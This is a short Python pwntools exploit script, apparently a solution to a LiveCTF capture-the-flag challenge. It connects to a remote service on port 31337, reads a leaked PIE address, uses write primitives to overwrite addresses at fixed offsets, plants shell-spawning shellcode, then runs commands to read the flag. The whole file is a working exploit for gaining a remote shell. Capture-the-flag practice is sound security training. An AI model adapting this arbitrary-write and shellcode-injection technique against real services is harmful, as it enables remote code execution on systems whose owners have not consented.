#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

while len(shellcode) % 8 != 0:
    shellcode += b'\x90'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

proc = remote(HOST, int(PORT))
#proc = process("../handout/challenge")

pie_leak = u64(proc.recv(8))
print(hex(pie_leak))

proc.send(p64(pie_leak + 0x4330))
proc.send(p64(pie_leak + 0x1370))

proc.send(p64(pie_leak + 0x4338))
proc.send(p64(pie_leak + 0x2000))

proc.send(p64(0))

proc.send(p32(0))

for i in range(0, len(shellcode), 8):
    proc.send(p64(pie_leak + 0x2110 + i))
    proc.send(shellcode[i:(i+8)])

proc.send(p64(pie_leak + 0x4340))

proc.sendline(b"ls")
proc.sendline(b'./submitter')
flag = proc.recvline_contains(b'LiveCTF{').decode().strip()

print(flag)
